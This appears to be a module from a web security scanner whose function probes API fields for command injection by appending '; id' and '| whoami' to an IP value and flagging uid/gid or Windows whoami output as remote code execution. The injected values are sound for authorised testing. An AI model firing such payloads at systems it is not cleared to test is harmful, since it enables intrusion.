from typing import Any, Dict, List
import time
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    # ... previous structure ...
    payloads = [
        "; id", "| whoami", 
    ]
    fields = scenario.config.get("fields", ["ip", "host", "command"])
    issues = []
    leaked_data = [] 
    
    for field in fields:
        for p in payloads:
            body = {"ip": "127.0.0.1"} 
            body[field] = f"127.0.0.1 {p}" 
            
            resp = client.send(scenario.method, scenario.target, json_body=body)

            suspicious = False
            reasons = []
            text = resp.text.lower()
            
            if "uid=" in text and "gid=" in text:
                suspicious = True
                reasons.append("Command Output: 'uid/gid'")
                leaked_data.append(f"SHELL OUTPUT: {resp.text.strip()[:100]}")
                
            if "nt authority" in text:
                suspicious = True
                reasons.append("Command Output: Windows 'whoami'")
                leaked_data.append(f"SHELL OUTPUT: {resp.text.strip()[:100]}")
                
            if suspicious:
                issues.append(f"[CRITICAL] RCE Probability in '{field}': {', '.join(reasons)}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "rce",
        "passed": len(issues) == 0,
        "details": {
            "issues": issues,
            "leaked_data": list(set(leaked_data))
        }
    }
